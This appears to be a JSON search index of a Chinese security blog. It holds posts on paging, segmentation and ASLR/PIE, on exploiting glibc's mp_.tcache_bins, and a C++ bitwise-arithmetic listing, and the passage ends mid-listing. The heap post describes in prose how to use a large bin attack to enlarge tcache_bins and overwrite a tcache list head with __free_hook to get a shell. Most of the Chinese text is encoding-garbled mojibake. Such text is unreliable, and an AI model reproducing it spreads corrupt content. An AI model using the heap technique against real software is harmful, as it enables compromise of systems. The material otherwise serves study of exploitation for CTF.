[{"categories":["principle","åº•å±‚æ¶æ„"],"contents":" Always remember that you are absolutely unique. Just like everyone else. â€” Margaret Mead\nç›´æ¥è·‘åœ¨ç‰©ç†åœ°å€ ä¸€å¼€å§‹äººä»¬å°†ç¨‹åºç›´æ¥è·‘åœ¨ç‰©ç†åœ°å€ä¸Šï¼Œä½†è¿™æ ·ä¼šå‡ºç°å‡ ä¸ªé—®é¢˜ï¼š\nåœ°å€ç©ºé—´å’Œå…¶ä»–ç¨‹åºä¸éš”ç¦»ã€‚ æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœä½ åŒæ—¶åœ¨è·‘ä¸¤ä¸ªä¸ç›¸å¹²çš„ç¨‹åºï¼Œå› ä¸ºå…¶ä¸­ä¸€ä¸ªç¨‹åºæº¢å‡ºäº†è‡ªå·±çš„åœ°å€ç©ºé—´è€Œå¹²æ‰°åˆ°å¦å¤–ä¸€ä¸ªç¨‹åºï¼Œå¯¼è‡´è¿™ä¸ªç¨‹åºå´©æºƒâ€¦â€¦ å†…å­˜ä½¿ç”¨æ•ˆç‡ä½ã€‚ å½“è®¡ç®—æœºè¿è¡Œæ—¶ï¼ŒæŸä¸ªæ—¶é—´æ®µå†…ï¼Œå®ƒåªæ˜¯ä½¿ç”¨äº†ä¸€å°éƒ¨åˆ†çš„æ•°æ®ã€‚å…¶ä»–æ•°æ®åœ¨ä¸€ä¸ªæ—¶é—´æ®µå†…å¹¶ä¸ä¼šè¢«ä½¿ç”¨ã€‚è€Œæ­¤æ—¶å¦‚æœæˆ‘ä»¬å¿½ç„¶éœ€è¦è¿è¡Œä¸€ä¸ªæ–°çš„ç¨‹åºï¼Œè€Œæ­¤æ—¶å†…å­˜ç©ºé—´ä¸å¤Ÿï¼Œé‚£æˆ‘ä»¬è¦å…ˆå°†åŸæ¥çš„ç¨‹åºå†™å…¥ç£ç›˜ï¼Œç­‰åˆ°æ–°ç¨‹åºè¿è¡Œå®Œæ‰èƒ½é‡æ–°è¯»å›å†…å­˜ï¼Œè¿™ç§é¢‘ç¹çš„IOæ“ä½œæåº¦æµªè´¹èµ„æºã€‚ï¼ˆè¿˜æœ‰å†…å­˜ç¢ç‰‡çš„é—®é¢˜ï¼‰ ç¨‹åºè¿è¡Œçš„åœ°å€ä¸ç¡®å®šã€‚ å› ä¸ºç¨‹åºæ˜¯ç›´æ¥è·‘åœ¨ç‰©ç†åœ°å€ä¸Šçš„ï¼Œè€Œç‰©ç†åœ°å€å…·æœ‰å”¯ä¸€æ€§ï¼Œé‚£ä¹ˆå°±å¾ˆéš¾ä¿è¯ç¨‹åºè¿è¡Œçš„æ—¶å€™åœ°å€æ˜¯ç¡®å®šçš„ã€‚è¿™å°±ä¼šå¯¹é‡å®šå‘é€ æˆå¾ˆå¤§çš„éº»çƒ¦ï¼Œé™æ€é“¾æ¥çš„ç¨‹åºéœ€è¦åœ¨ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶éƒ½æ ¹æ®ç¨‹åºå½“å‰è¿è¡Œçš„åœ°å€é‡æ–°è¿›è¡Œé‡å®šå‘ï¼Œè¿™ç®€ç›´æ˜¯ä¸å¯ç†å–»çš„ã€‚ è™šæ‹Ÿåœ°å€ æ—¢ç„¶ä¸èƒ½è·‘åœ¨ç‰©ç†åœ°å€ä¸Šï¼Œé‚£æˆ‘ä»¬å¯ä¸å¯ä»¥å°†æ¯æ¬¡éƒ½ä¸åŒçš„ç‰©ç†åœ°å€æ˜ å°„æˆä¸€ä¸ªç¡®å®šçš„è™šæ‹Ÿåœ°å€ï¼Ÿæ¯”å¦‚ä¸€ä¸ªç¨‹åºçš„åŸºå€æ˜¯0x84000ï¼Œæ¯æ¬¡å°†è¿™ä¸ªç¨‹åºè£…è½½å…¥å†…å­˜çš„æ—¶å€™å°±å°†åˆ†é…åˆ°çš„ç‰©ç†åœ°å€æ˜ å°„æˆè¿™ä¸ªåœ°å€ï¼Œç„¶åç¨‹åºå°±è·‘åœ¨è¿™ä¸ªè™šæ‹Ÿåœ°å€ä¸Šï¼Œé€šè¿‡ä¸€ä¸ªæ˜ å°„å’Œç‰©ç†åœ°å€é€šä¿¡ã€‚\nå¤æ—©çš„åˆ†æ®µ å› ä¸ºæœ‰äº†è™šæ‹Ÿåœ°å€çš„æƒ³æ³•ï¼Œæ‰€ä»¥äººä»¬è‡ªç„¶è€Œç„¶åœ°æƒ³åˆ°å°†ç‰©ç†åœ°å€åˆ†æˆä¸€æ®µä¸€æ®µä¸åŒå¤§å°çš„æ˜ å°„æˆè™šæ‹Ÿåœ°å€ã€‚\nè¿™ç§æƒ³æ³•å’Œç›´æ¥è·‘åœ¨ç‰©ç†åœ°å€ä¸Šçš„æƒ³æ³•å·®åˆ«ä¸å¤§ï¼Œåªæ˜¯è¿›è¡Œäº†åœ°å€ç©ºé—´çš„éš”ç¦»ä¸ç¡®å®šã€‚\nè¿™æ ·å°±å¯ä»¥è§£å†³ä¹‹å‰æå‡ºçš„1ã€3ä¸¤ä¸ªé—®é¢˜ã€‚\nå› ä¸ºåœ°å€æ˜¯è™šæ‹Ÿçš„ï¼Œæ‰€ä»¥æ“ä½œç³»ç»Ÿå¯ä»¥ç›‘æ§è¿™ä¸€æ®µè™šæ‹Ÿåœ°å€ï¼Œä¸€æ—¦è®¿é—®è¶…å‡ºäº†è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œç¡¬ä»¶å°±åˆ¤å®šç¨‹åºäº§ç”Ÿäº†éæ³•çš„è®¿é—®ï¼Œå¹¶å°†å…¶ä¸ŠæŠ¥ç»™æ“ä½œç³»ç»Ÿæˆ–è€…ç›‘æ§ç¨‹åºï¼Œç”±å®ƒæ¥åˆ¤å†³ã€‚ åŒæ—¶ï¼Œå› ä¸ºåœ°å€æ˜¯è™šæ‹Ÿçš„ï¼Œæ‰€ä»¥åœ°å€å¯ä»¥ä¸€ç›´ç¡®å®šã€‚ï¼ˆç°åœ¨æœ‰äº›ç¨‹åºä¼šä½¿ç”¨PIEï¼ˆPosition-Independent Executableï¼Œä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼‰è®©ç¨‹åºæ¯æ¬¡è¿è¡Œçš„åŸºå€éƒ½ä¸ä¸€æ ·æ¥ä¿æŠ¤ç¨‹åºï¼Œä½†æ˜¯è¿™æ ·å¿…ç„¶ä¼šå½±å“åˆ°ç¨‹åºçš„æ•ˆç‡ï¼Œå› æ­¤ä¸€èˆ¬åªæœ‰ä¸€äº›å®‰å…¨æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„ç¨‹åºä½¿ç”¨ï¼ˆä½†æ˜¯gccæ˜¯é»˜è®¤æœ‰PIEçš„ï¼‰ï¼‰ ä½†æ˜¯åˆ†æ®µæ²¡æœ‰åŠæ³•è§£å†³ç¬¬äºŒä¸ªé—®é¢˜ï¼Œå› ä¸ºå®ƒæœ¬è´¨ä¸Šè¿˜æ˜¯è·‘åœ¨ç‰©ç†åœ°å€ä¸Šï¼Œåªæ˜¯å¯¹åœ°å€è¿›è¡Œäº†å¤„ç†ã€‚\nåˆ†é¡µ å› æ­¤ï¼Œäººä»¬æƒ³å‡ºäº†ä¸€ç§ç²’åº¦æ›´é«˜çš„å†…å­˜åˆ†å‰²å’Œæ˜ å°„æ–¹æ³•â€”â€”åˆ†é¡µã€‚\nåˆ†é¡µçš„æ€æƒ³æ˜¯æŒ‡æŠŠåœ°å€ç©ºé—´äººä¸ºåœ°åˆ†æˆå¤§å°ç›¸ç­‰çš„è‹¥å¹²ä»½ï¼Œä¸€ä»½ç§°ä¸ºä¸€é¡µï¼Œå°±åƒä¸€æœ¬ä¹¦ç”±å¾ˆå¤šé¡µé¢ç»„æˆï¼Œæ¯ä¸ªé¡µé¢å¤§å°ç›¸ç­‰ã€‚ä¹Ÿå°±æ˜¯è¯´å†…å­˜æ¡å¯ä»¥çœ‹ä¸ºä¸€æœ¬ä¹¦ï¼Œé‡Œé¢çš„ç‰©ç†å†…å­˜è¢«åˆ†ä¸ºä¸€é¡µä¸€é¡µæ¥ç®¡ç†ï¼Œä»¥é¡µä¸ºå•ä½å¯¹å†…å­˜è¿›è¡Œæ¢å…¥æ¢å‡ºã€‚å³ï¼š\nå½“ç¨‹åºè¿è¡Œæ—¶ï¼Œåªéœ€è¦å°†å¿…è¦çš„æ•°æ®ä»ç£ç›˜è¯»å–åˆ°å†…å­˜ï¼Œæš‚æ—¶ç”¨ä¸åˆ°çš„æ•°æ®å…ˆç•™åœ¨ç£ç›˜ä¸­ï¼Œä»€ä¹ˆæ—¶å€™ç”¨åˆ°ä»€ä¹ˆæ—¶å€™è¯»å–ã€‚ å½“ç‰©ç†å†…å­˜ä¸è¶³æ—¶ï¼Œåªéœ€è¦å°†åŸæ¥ç¨‹åºçš„éƒ¨åˆ†æ•°æ®å†™å…¥ç£ç›˜ï¼Œè…¾å‡ºè¶³å¤Ÿçš„ç©ºé—´å³å¯ï¼Œä¸ç”¨æŠŠæ•´ä¸ªç¨‹åºéƒ½å†™å…¥ç£ç›˜ã€‚ ï¼ˆä¸Šé¢çš„å†…å®¹æ¥è‡ªè®¡ç®—æœºå†…å­˜çš„åˆ†é¡µæœºåˆ¶_ä¸€é¢—æ—¥æˆçš„åšå®¢-CSDNåšå®¢ï¼‰\nï¼ˆDP = Disk Page, VP = Virtual Page, PP = Physical Pageï¼‰\nå¯¹äºç°ä»£æ“ä½œç³»ç»Ÿæ¥è¯´ï¼Œé¡µçš„å¤§å°ä¸€èˆ¬æ˜¯4KBï¼ˆæ¯”å¦‚ Intel Pentium ç³»åˆ—å¤„ç†å™¨æ”¯æŒ 4KB æˆ– 4MB çš„é¡µå¤§å°ï¼Œé‚£ä¹ˆæ“ä½œç³»ç»Ÿå¯ä»¥é€‰æ‹©æ¯é¡µå¤§å°ä¸º 4KBï¼Œä¹Ÿå¯ä»¥é€‰æ‹©æ¯é¡µå¤§å°ä¸º 4MBï¼Œä½†æ˜¯åœ¨åŒä¸€æ—¶åˆ»åªèƒ½é€‰æ‹©ä¸€ç§å¤§å°ï¼Œæ‰€ä»¥å¯¹æ•´ä¸ªç³»ç»Ÿæ¥è¯´ï¼Œä¹Ÿå°±æ˜¯å›ºå®šå¤§å°çš„ã€‚ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯pwnä¸­libcåŸºå€æœ€åä¸‰ä½ä¸å˜çš„åŸå› ã€‚\nç¨‹åºçš„åˆ†æ®µ åœ¨ä¸€ä¸ªç¨‹åºçš„è™šæ‹Ÿç©ºé—´ä¹‹ä¸­ï¼Œç”±äºæˆ‘ä»¬éœ€è¦å®ç°æ•°æ®ä¸æŒ‡ä»¤ç­‰çš„éš”ç¦»ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»ç„¶éœ€è¦è¿›è¡Œåˆ†æ®µï¼ˆåˆ†æ®µçš„ç›®çš„æ˜¯ä¸ºäº†æ›´å¥½åœ°æ»¡è¶³ç”¨æˆ·çš„éœ€è¦ï¼‰\næ¯”å¦‚ï¼Œåœ¨ELFä¸­ï¼Œæˆ‘ä»¬ä¼šå°†ç¨‹åºåˆ†ä¸ºtextæ®µã€dataæ®µç­‰ï¼Œç„¶åæ¯ä¸ªæ®µå†åˆ†ä¸ºä¸åŒçš„èŠ‚ï¼Œå¦‚.textèŠ‚ã€.rodataèŠ‚ã€.bssèŠ‚ç­‰ï¼Œæ“ä½œç³»ç»Ÿä¸ºä»–ä»¬åˆ†é…äº†ä¸åŒçš„rwxæƒé™ï¼ˆè¯»ã€å†™ã€å¯æ‰§è¡Œï¼‰ï¼Œä¸”åªæœ‰æ“ä½œç³»ç»Ÿå¯ä»¥æ›´æ”¹ã€‚å…·ä½“å¯ä»¥çœ‹æˆ‘åšå®¢çš„è¿™ç¯‡æ–‡ç« ELFè¯¦è§£ - P3troL1er çš„ä¸ªäººåšå®¢\næœ‰ä¸€äº›æ®µæ˜¯åœ¨ç¼–è¯‘é“¾æ¥æœŸé—´å°±ç¡®å®šå¥½çš„ï¼Œæœ‰ä¸€äº›æ®µï¼Œæ¯”å¦‚å †ã€æ ˆæ˜¯åœ¨è£…è½½çš„æ—¶å€™æ‰ç¡®å®šçš„ï¼Œå®è§‚åœ°çœ‹ï¼Œæ•´ä¸ªè™šæ‹Ÿç©ºé—´é•¿è¿™æ ·ï¼š\nï¼ˆå›¾ç‰‡æ¥æºï¼šå †æ¦‚è¿° - CTF Wikiï¼‰\nä¸€èˆ¬æ¥è¯´ï¼Œæ“ä½œç³»ç»Ÿä¼šä½¿ç”¨ASLRï¼ˆAddress Space Layout Randomizationï¼Œåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰å¯¹å †ã€æ ˆç­‰åœ¨è£…è½½æœŸé—´ç¡®å®šåœ°å€çš„æ®µè¿›è¡ŒéšæœºåŒ–ä¿æŠ¤ï¼Œå¦‚ä¸Šå›¾ä¸­æ ˆå’Œå †çš„éšæœºåç§»é‡ï¼ˆRandom offsetï¼‰\nä¸åŒçš„ASLRç­‰çº§ä¿æŠ¤ä¹Ÿä¸åŒï¼Œå®ƒå¸¸å¸¸ä¼šå’ŒPIEä¸€èµ·å®ç°éšæœºåŒ–ï¼š\nASLR Executable PLT Heap Stack Shared libraries 0 Ã— Ã— Ã— Ã— Ã— 1 Ã— Ã— Ã— âˆš âˆš 2 Ã— Ã— âˆš âˆš âˆš 2+PIE âˆš âˆš âˆš âˆš âˆš Linuxä¸‹å¯ä»¥é€šè¿‡æ›´æ”¹/proc/sys/kernel/randomize_va_spaceæ¥è®¾ç½®ASLRç­‰çº§\n","date":"2023å¹´02æœˆ23æ—¥","permalink":"https://peterliuzhi.top/principle/%E5%88%86%E9%A1%B5%E5%88%86%E6%AE%B5%E5%92%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","section":"principle","summary":"Always remember that you are absolutely unique. Just like everyone else. â€” Margaret Mead ç›´æ¥è·‘åœ¨ç‰©ç†åœ°å€ ä¸€å¼€å§‹äººä»¬å°†ç¨‹åºç›´æ¥è·‘åœ¨ç‰©ç†åœ°å€ä¸Šï¼Œä½†è¿™æ ·ä¼šå‡ºç°å‡ ä¸ªé—®é¢˜ï¼š åœ°å€ç©ºé—´å’Œå…¶ä»–ç¨‹åºä¸éš”ç¦»ã€‚ æƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœä½ åŒæ—¶åœ¨","tags":["pwn"],"title":"åˆ†é¡µã€åˆ†æ®µå’Œè™šæ‹Ÿåœ°å€_åŸºç¡€çŸ¥è¯†"},{"categories":["principle"],"contents":" It\u0026rsquo;s not what you look at that matters, it\u0026rsquo;s what you see. â€” Henry David Thoreau\nä»€ä¹ˆæ˜¯mp_ç»“æ„ä½“ï¼Ÿ æˆ‘ä»¬å¯ä»¥åœ¨identifier - Glibc source code (glibc-2.37) - Bootlinæœç´¢mp_ï¼Œä¼šå‘ç°å®ƒæ˜¯ä¸€ä¸ªå†…éƒ¨é“¾æ¥çš„å…¨å±€å˜é‡ï¼Œç±»å‹æ˜¯malloc_parç»“æ„ä½“ï¼š\nè¿™è¯´æ˜å®ƒä¸ä¼šå‡ºç°åœ¨libcçš„ç¬¦å·è¡¨ä¸­ï¼Œéœ€è¦é€šè¿‡gdbè°ƒè¯•è·å–åç§»ï¼š\nè€Œé€šè¿‡å®ƒçš„åå­—å’Œèµ‹å€¼æˆ‘ä»¬ä¹Ÿå¯ä»¥å¾ˆæ¸…æ™°åœ°çŒœæµ‹åˆ°ï¼Œè¿™ä¸ªtcache_binsåŸŸæ˜¯ç”¨æ¥è®°å½•tcache binçš„æœ€å¤§ç´¢å¼•å€¼çš„ï¼Œè¶…è¿‡è¿™ä¸ªç´¢å¼•å€¼çš„å †å—éƒ½ä¸å±äºtcache binã€‚\nè¿™ä¸ªç´¢å¼•å€¼æ˜¯é€šè¿‡å †å—çš„å¤§å°è®¡ç®—çš„ã€‚ä¹‹æ‰€ä»¥è¦è®¡ç®—è¿™ä¸ªç´¢å¼•å€¼ï¼Œæ˜¯å› ä¸ºæ‰€æœ‰çš„binå­˜åœ¨ä¸€ä¸ªå¤§å°ä¸º136çš„æ•°ç»„é‡Œé¢ï¼Œtcache binã€large binç­‰éƒ½ç®¡ç†ä¸€å®šèŒƒå›´å†…çš„binã€‚é€šè¿‡å¤§å°è®¡ç®—è¿™ä¸ªç´¢å¼•å¯ä»¥å¾ˆæ–¹ä¾¿åœ°åˆ¤æ–­ä¸€ä¸ªå †å—åº”å±å“ªä¸ªbin\nmp_.tcache_binsæœ‰ä»€ä¹ˆç”¨ï¼Ÿ é‚£ä¹ˆè¿™ä¸ªmp_.tcache_binsæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ\nå¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä¼ªé€ ä¸€ä¸ªå¤§chunkï¼Œè®©å®ƒä»¥tcacheçš„æ–¹å¼è¢«è·å–ï¼ˆè¿™æ ·å°±å¯ä»¥ä½¿ç”¨ä¸tcacheç›¸å…³çš„æ”»å‡»æ‰‹æ®µæ”»å‡»ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦ä¼ªé€ ä»¥ä¸‹ä¸¤ä¸ªå€¼ï¼š\nmp_.tcache_binsè¶³å¤Ÿå¤§ã€‚å¯ä»¥é€šè¿‡unsorted bin attackï¼ˆé«˜ç‰ˆæœ¬ä¸å¯ç”¨ï¼‰æˆ–è€…large bin attackç­‰æ–¹å¼å‘mp_.tcache_binså†…å†™å…¥ä¸€ä¸ªè¶³å¤Ÿå¤§çš„å€¼å®ç° tcache-\u0026gt;counts[tc_idx] \u0026gt; 0ã€‚ ç¬¬äºŒç‚¹å¦‚ä½•å®ç°å‘¢ï¼Ÿæˆ‘ä»¬å¦‚ä½•æ›´æ”¹è¿™ä¸ªcountså€¼å‘¢ï¼Ÿ\nå› ä¸ºtcacheç»“æ„ä½“æ˜¯å­˜æ”¾åœ¨å †ä¸Šçš„ï¼ˆé€šå¸¸æ˜¯ç¬¬ä¸€ä¸ªå †å—ï¼‰ï¼Œå½“ç„¶å¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹å¼è¦†å†™countså€¼ï¼Œä½†åœ¨è¿™é‡Œå…¶å®å¯ä»¥åˆ©ç”¨tcache binæœ¬èº«çš„æ¼æ´ã€‚\nå½“mp_.tcache_binsè¶³å¤Ÿå¤§çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥å°†ä¸€ä¸ªå¤§chunkæ”¾è¿›tcache binä¸­çš„ï¼Œåªæ˜¯ç”±äºtcacheåˆ†é…åœ¨å †ä¸Šï¼Œè¿™ä¸ªç´¢å¼•å€¼åˆå¤ªå¤§ï¼Œæ‰€ä»¥è¿™ä¸ªå¤§chunkçš„åœ°å€ï¼ˆé“¾è¡¨å¤´ï¼‰ä¼šè¢«æ”¾è¿›ç›¸é‚»çš„chunkä¸­\nåŒæ—¶ï¼Œtcache_geté‡Œä¹Ÿæ²¡æœ‰å¯¹è¶Šç•Œçš„æ£€æŸ¥ï¼š\nPS. å…¶ä¸­ï¼Œif (__glibc_unlikely (!aligned_OK (e)))malloc_printerr (\u0026quot;malloc(): unaligned tcache chunk detected\u0026quot;);è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯æ£€æŸ¥ä»tcacheä¸­è·å–çš„å†…å­˜å—çš„åœ°å€æ˜¯å¦æŒ‰ç…§æŒ‡å®šçš„å¯¹é½æ–¹å¼å¯¹é½ï¼ˆ__glibc_unlikelyç”¨äºç¼–è¯‘å™¨ä¼˜åŒ–ï¼‰ï¼Œè¿™äº›éƒ½å’Œè¶Šç•Œæ— å…³\nåŒæ—¶ï¼Œtcache_putä¹Ÿå…è®¸æˆ‘ä»¬æ”¾å…¥ä¸€ä¸ªå¤§chunkï¼Œç”šè‡³é“¾è¡¨å¤´éƒ½æ˜¯ä¸åŠ å¯†çš„\nå› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶ç›¸é‚»å †å—ï¼Œé‚£ä¹ˆæˆ‘ä»¬é‡Šæ”¾çš„å¤§å †å—æ‰€å±çš„é“¾è¡¨å¤´ä¹Ÿæ˜¯å¯æ§çš„ã€‚\nå…·ä½“åº”è¯¥å¦‚ä½•æ“ä½œï¼Ÿ ä»¥ä¸Šè¿™ä¸€é€šæ“ä½œèƒ½å¤Ÿå®ç°çš„å‰ææ˜¯mp_.tcache_binsé€šè¿‡unsorted bin attackæˆ–è€…large bin attackç­‰æ–¹å¼å¢å¤§\nmp_.tcache_bins = mp_ + 0x50 = mp_ + 80ï¼Œå¦‚æœç”¨large bin attackè¦†å†™ï¼Œè¦å†™å…¥çš„åœ°å€æ˜¯mp_ + 0x30ã€‚large bin attackçš„å…·ä½“è§£æè§æˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« Largebin_Attack - P3troL1er çš„ä¸ªäººåšå®¢\nç„¶åæˆ‘ä»¬è¦é‡Šæ”¾ä¸€ä¸ªå¤§å°ä¸ºNçš„å¤§å †å—p1è¿›å…¥tcache binï¼Œç„¶åè®°ä¸‹å®ƒçš„åœ°å€ï¼ˆå¯ä»¥é€šè¿‡ä¸‹æ–­ç‚¹åˆ°freeé‚£é‡ŒæŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥é€šè¿‡heapç­‰å‘½ä»¤æŸ¥çœ‹å †åˆ†å¸ƒè·å–ï¼‰\nç„¶åé€šè¿‡x/150gxæˆ–è€…teleå‘½ä»¤æ‰¾åˆ°è¿™ä¸ªåœ°å€å­˜æ”¾çš„ä½ç½®å’Œæˆ‘ä»¬å¯æ§çš„ç›¸é‚»chunkå¤´éƒ¨çš„å·®å€¼\nè¿™é‡Œæ„Ÿè°¢ç¾¤é‡ŒL0tuså’Œh4kuy4ç­‰å¸ˆå‚…çš„è€å¿ƒæŒ‡å¯¼ï¼Œè¿™ä¸‰å¼ å›¾ä¹Ÿæ˜¯æ¥è‡ªä»–ä»¬~\nç„¶åæˆ‘ä»¬å°±å¯ä»¥å°†é“¾è¡¨å¤´åœ°å€è¦†ç›–ä¸º__free_hookç­‰ï¼Œå®ç°getshellã€‚\nå¦‚æœæœ‰ä»€ä¹ˆé—®é¢˜æˆ–è€…å»ºè®®ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºè¯„è®ºæŒ‡å‡º~\n","date":"2023å¹´02æœˆ23æ—¥","permalink":"https://peterliuzhi.top/principle/mp_.tcache_bins%E5%9F%BA%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","section":"principle","summary":"It\u0026rsquo;s not what you look at that matters, it\u0026rsquo;s what you see. â€” Henry David Thoreau ä»€ä¹ˆæ˜¯mp_ç»“æ„ä½“ï¼Ÿ æˆ‘ä»¬å¯ä»¥åœ¨identifier - Glibc source code (glibc-2.37) - Bootlinæœç´¢mp_ï¼Œä¼šå‘ç°å®ƒæ˜¯ä¸€ä¸ªå†…éƒ¨é“¾æ¥çš„å…¨å±€å˜","tags":["pwn","mp_.tcache_bins"],"title":"mp_.tcache_binsåŸºæœ¬æ¼æ´åˆ©ç”¨"},{"categories":["posts"],"contents":" Always tell the truth. That way, you don\u0026rsquo;t have to remember what you said. â€” Mark Twain\næœ€è¿‘åœ¨ä¸Šæ•°å­—é€»è¾‘ï¼Œæƒ³èµ·ä»¥å‰åšè¿‡çš„ä¸€é“ç®—æ³•é¢˜ï¼ˆä¸ç”¨åŠ æ³•ç¬¦å®ç°ä¸¤æ•°ç›¸åŠ ï¼‰ï¼Œçªå‘å¥‡æƒ³æƒ³è¦çº¯ç”¨ä½è¿ç®—å®ç°ä¸€ä¸‹åŠ å‡ä¹˜é™¤æ¨¡\nä»¥å‰æœ€å¤šå®ç°åŠ å‡ä¹˜ï¼Œå¯¹é™¤æ³•ä¸€ç›´æ²¡æƒ³åˆ°çº¯ç²¹ä½è¿ç®—çš„æ–¹å¼ï¼Œä»Šå¤©ç®—æ˜¯â€œåœ†æ¢¦â€äº†\næ³¨æ„ï¼Œæˆ‘å†™çš„è¿™å‡ ä¸ªå‡½æ•°åªèƒ½ç”¨äºæ•´æ•°ï¼ˆåŒ…æ‹¬intã€longã€long longè¿˜æœ‰ä»–ä»¬çš„unsignedå½¢å¼ï¼‰ï¼Œä½¿ç”¨C++ä¸»è¦æ˜¯å¯ä»¥ä½¿ç”¨æ¨¡æ¿å®ç°æ³›å‹ï¼Œå¦‚æœçº¯ç”¨Cå¯èƒ½å°±éœ€è¦è½¬æˆvoid*ä¹‹ç±»çš„æ¯”è¾ƒå¤æ‚çš„æ“ä½œï¼ˆæˆ–è€…ä½¿ç”¨å®ä¸­çš„##è¿æ¥ç¬¦å®ç°é‡è½½ï¼‰\nä¸‹é¢æ˜¯å…·ä½“çš„ä»£ç ï¼Œå¦‚æœæ‚¨å‘ç°äº†bugå¯ä»¥åœ¨ä¸‹é¢çš„disqusè¯„è®ºå‘Šè¯‰æˆ‘~\ntemplate \u0026lt;typename NUM\u0026gt; NUM add(NUM a, NUM b){ while (b != 0) { // ç­›é€‰å‡ºaä¸­ä½ä¸º1çš„åŒæ—¶bä¸­ä½ä¸º1ï¼Œç„¶åå·¦ç§»ä¸€ä½å½“ä½œè¿›ä½ NUM tmp = (a \u0026amp; b) \u0026lt;\u0026lt; 1; a ^= b; b = tmp; } return a; } template \u0026lt;typename NUM\u0026gt; NUM minus(NUM a, NUM b){ while (b != 0) { // ç­›é€‰å‡ºaä¸­ä½ä¸º0çš„åŒæ—¶bä¸­ä½ä¸º1ï¼Œç„¶åå·¦ç§»ä¸€ä½å½“ä½œè¿›ä½ NUM tmp = ((~a) \u0026amp; b) \u0026lt;\u0026lt; 1; a ^= b; b = tmp; } return a; } template \u0026lt;typename NUM\u0026gt; NUM multiply(NUM a, NUM b){ bool sign = false; if (a \u0026lt; 0) { sign = !sign; a = add(~a, 1); } if (b \u0026lt; 0) { sign = !sign; b = add(~b, 1); } // æœ‰ä¸€ä¸ªç­‰äº0ç›´æ¥è¿”å› if (a == 0 || b == 0) { return 0; } NUM sum = 0; // è®°å½•ç»“æœ char cnt = 0; // è®°å½•å·¦ç§»å¤šå°‘ä½ while (b != 0) { // å¦‚æœè¿™ä½æ˜¯1ï¼Œå°±è¦å°†aå·¦ç§»cntä½å¹¶åŠ ä¸Š if (b \u0026amp; 0x1) { sum = add(sum, a \u0026lt;\u0026lt; cnt); } b \u0026gt;\u0026gt;= 1; ++cnt; } // å¤„ç†ç¬¦å· if (sign) { return add(~sum, 1); }else { return sum; } } template \u0026lt;typename NUM\u0026gt; NUM* basic_divide(NUM a, NUM b, NUM* ret){ if (a == 0) { ret[0] = 0; ret[1] = 0; return ret; }else if (b == 0) { ret[0] = a; ret[1] = 0; std::cerr \u0026lt;\u0026lt; \u0026#34;dividing 0!\\n\u0026#34;; return ret; } bool sign = false; if (a \u0026lt; 0) { sign = !sign; a = add(~a, 1); } if (b \u0026lt; 0) { sign = !sign; b = add(~b, 1); } NUM result = 0; NUM max = b; char cnt = 1; while ((b \u0026lt;\u0026lt; 1) \u0026lt; a) { b \u0026lt;\u0026lt;= 1; ++cnt; } while (cnt \u0026gt; 0) { if (a \u0026gt;= b) { a = minus(a, b); result = (result \u0026lt;\u0026lt; 1) ^ 0x1; }else { result \u0026lt;\u0026lt;= 1; } b \u0026gt;\u0026gt;= 1; --cnt; } if (sign) { ret[0] = add(~result, 1); ret[1] = add(~a, 1); }else { ret[0] = result; ret[1] = a; } return ret; } template \u0026lt;typename NUM\u0026gt; NUM divide(NUM a, NUM b){ NUM result[2] {0}; return basic_divide(a, b, result)[0]; } template \u0026lt;typename NUM\u0026gt; NUM mod(NUM a, NUM b){ NUM result[2] {0}; return basic_divide(a, b, result)[1]; } ç”±äºæ¨¡æ¿å‡½æ•°çš„å®šä¹‰å’Œå£°æ˜ä¸èƒ½åˆ†å¼€ï¼Œæ‰€ä»¥è¿™äº›ä»£ç éƒ½å¾—æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ”¾åœ¨cppæ–‡ä»¶ä¸­ç„¶ååœ¨å¤´æ–‡ä»¶åŒ…å«å®ƒï¼š\n#ifndef __ARITH_ARITH_H__ #define __ARITH_ARITH_H__ #include \u0026#34;arith.cpp\u0026#34; #endif /* __ARITH_ARITH_H__ */ åŠ æ³•çš„æ€è·¯å°±æ˜¯ç”¨ä¸”è¿ç®—è·å–åŒä¸º1çš„ä½ï¼Œç„¶åå·¦ç§»ä¸€ä½ä½œä¸ºè¿›ä½ï¼Œä¸€ç›´whileå¾ªç¯ç›´åˆ°è¿›ä½ä¸º0\nå‡æ³•çš„æ€è·¯å°±æ˜¯ç”¨å¤æ‚çš„ä½è¿ç®—è·å–è¢«å‡æ•°ä¸º0è€Œå‡æ•°ä¸º1çš„ä½ï¼Œç„¶åå·¦ç§»ä¸€ä½ä½œä¸ºå€Ÿä½ï¼Œä¸€ç›´whileå¾ªç¯ç›´åˆ°å€Ÿä½ä¸º0\nä¹˜æ³•çš„æ€è·¯å°±æ˜¯å°†å…¶ä¸­ä¸€ä¸ªä¹˜æ•°çœ‹ä½œæ•°ä¸ªæƒå€¼çš„å’Œï¼Œæ¯”å¦‚3 = 0b11 = 2^0 + 2^1ï¼Œè€Œä¸€ä¸ªæ•°ä¹˜ä»¥2çš„næ¬¡æ–¹å¯ä»¥çœ‹ä½œå‘å·¦ç§»åŠ¨nä½ï¼Œç„¶åå°†ä»–ä»¬å…¨éƒ¨åŠ 